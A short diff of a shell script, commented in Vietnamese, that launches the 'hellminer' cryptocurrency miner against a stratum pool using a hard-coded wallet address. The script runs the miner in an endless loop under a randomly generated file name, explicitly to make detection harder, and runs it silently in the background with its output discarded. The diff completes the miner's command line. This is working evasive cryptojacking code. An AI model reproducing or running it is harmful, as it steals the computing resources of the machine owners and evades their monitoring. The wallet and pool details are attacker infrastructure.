@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/sh
 
 # Tạo một tên tệp ngẫu nhiên để khó phát hiện hơn
 generate_random_name() {
@@ -20,7 +20,7 @@ while true; do
   mv hellminer "$random_name"
 
   # Chạy chương trình trong 1 phút với tên đã đổi, ẩn danh và chạy ngầm
-  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vp>
+  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgit --cpu 2 >/dev/null 2>&1 &
   miner_pid=$!
   sleep 2m
 
